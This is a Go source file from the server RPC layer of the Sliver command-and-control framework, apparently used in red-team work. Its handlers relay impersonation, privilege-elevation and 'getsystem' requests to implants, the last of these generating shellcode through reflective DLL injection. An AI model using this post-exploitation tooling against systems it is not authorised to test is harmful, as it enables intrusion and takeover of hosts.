package rpc

import (
	"fmt"
	"time"

	clientpb "github.com/bishopfox/sliver/protobuf/client"
	implantpb "github.com/bishopfox/sliver/protobuf/implant"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

func rpcImpersonate(req []byte, timeout time.Duration, resp RPCResponse) {
	impersonateReq := &implantpb.ImpersonateReq{}
	err := proto.Unmarshal(req, impersonateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(impersonateReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	data, _ := proto.Marshal(&implantpb.ImpersonateReq{
		Process:  impersonateReq.Process,
		Username: impersonateReq.Username,
		Args:     impersonateReq.Args,
	})

	data, err = sliver.Request(implantpb.MsgImpersonateReq, timeout, data)
	resp(data, err)
}

func rpcGetSystem(req []byte, timeout time.Duration, resp RPCResponse) {
	gsReq := &clientpb.GetSystemReq{}
	err := proto.Unmarshal(req, gsReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(gsReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	config := generate.SliverConfigFromProtobuf(gsReq.Config)
	config.Format = clientpb.SliverConfig_SHARED_LIB
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&implantpb.GetSystemReq{
		Data:     shellcode,
		SliverID: gsReq.SliverID,
	})

	data, err = sliver.Request(implantpb.MsgGetSystemReq, timeout, data)
	resp(data, err)

}

func rpcElevate(req []byte, timeout time.Duration, resp RPCResponse) {
	elevateReq := &implantpb.ElevateReq{}
	err := proto.Unmarshal(req, elevateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(elevateReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	data, _ := proto.Marshal(&implantpb.ElevateReq{})

	data, err = sliver.Request(implantpb.MsgElevateReq, timeout, data)
	resp(data, err)

}
